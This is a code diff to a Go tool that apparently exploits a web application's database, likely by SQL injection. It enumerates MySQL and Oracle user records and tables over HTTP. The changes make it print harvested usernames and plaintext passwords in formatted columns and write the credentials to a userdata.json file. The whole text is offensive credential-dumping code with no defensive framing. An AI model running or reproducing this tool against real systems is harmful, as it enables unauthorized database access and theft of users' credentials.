@@ -3,6 +3,7 @@ package main
 import (
 		"fmt"
 		"io/ioutil"
+		"os"
 		"log"
 		"net/http"
 		"net/url"
@@ -75,7 +76,25 @@ func get_version() string {
 	return "Microsoft";
 }
 
-func write_json_file(name, json_string string) bool {
+func write_data(name string, userdata_obj []Userdata) bool {
+	err := ioutil.WriteFile(name, []byte("[\n"), 0644)
+	if (err != nil) {
+		log.Println(err);
+	}
+	file, err := os.OpenFile(name, os.O_APPEND|os.O_WRONLY, 0644);
+	if (err != nil) {
+		log.Println(err);
+	}
+	var data string;
+	for _, val := range userdata_obj {
+		defer file.Close();
+		data = "{\n\t\"id\":\""+val.Id+"\",\n\t\"username\":\""+val.Username+"\",\n\t\"password\":\""+val.Password+"\"\n},\n";
+		if _, err := file.WriteString(data); err != nil {
+			log.Fatal(err);
+		}
+	}
+	file.WriteString("]");
+	file.Close();
 	return true;
 }
 
@@ -84,7 +103,7 @@ func parse_data(data string) string {
 	foo := re.FindString(data);
 	reg := regexp.MustCompile(`\[(\{.*?\,?})+\]`);
 	bar := reg.FindString(foo);
-	final := strings.Replace(bar, "}{", "},{", 100);
+	final := strings.Replace(bar, "}{", "},{", 10000);
 	return string(final);
 }
 
@@ -102,8 +121,9 @@ func user_data_enum() {
 		json.Unmarshal([]byte(string(parsed_data)), &json_data);
 		fmt.Println("USER DATA DISCOVERED:\n");
 		for _, val := range json_data {
-			fmt.Printf("\tID: %s\t|\tUSER: %s\t|\tPASSWORD: %s\n", val.Id, val.Username, val.Password);
+			fmt.Printf("\tID: %-3s\t|\tUSER: %-18s\t|\tPASSWORD: %-25s\n", val.Id, val.Username, val.Password);
 		}
+		write_data("userdata.json", json_data);
 	}
 }
 
@@ -121,7 +141,7 @@ func oracle_user_data_enum() {
 		json.Unmarshal([]byte(string(parsed_data)), &json_data);
 		fmt.Println("USER DATA DISCOVERED:\n");
 		for _, val := range json_data {
-			fmt.Printf("\tID: %s\t|\tUSER: %s\t|\tPASSWORD: %s\n", val.Id, val.Username, val.Password);
+			fmt.Printf(" ID: %-3s| USER: %-18s| PASSWORD: %-25s\n", val.Id, val.Username, val.Password);
 		}
 	}
 }
@@ -133,8 +153,13 @@ func mysql_database_data_enum() {
 	};
 	code, body := get_response(data);
 	if (code == 200 && !(strings.Contains(body, "Fatal"))) {
-		fmt.Println(body);
-		write(data, "database_info.mysql");
+		var parsed_data string = parse_data(body);
+		var db_data []Userdata;
+		json.Unmarshal([]byte(string(parsed_data)), &db_data);
+		fmt.Println("DATABASE DATA DISCOVERED:\n");
+		for _, val := range db_data {
+			fmt.Printf("\tTABLE NAME: %-50s\t|\tTABLE SCHEMA: %-25s\t|\tTABLE TYPE: %-10s\n", val.Id, val.Username, val.Password);
+		}
 	}
 }
 
@@ -146,7 +171,7 @@ func oracle_database_data_enum() {
 	code, body := get_response(data);
 	if (code == 200 && !(strings.Contains(body, "Fatal"))) {
 		fmt.Println(body);
-		write_data(body, "database_info.oracle");
+		//write_data(body, "database_info.oracle");
 	}
 }
 
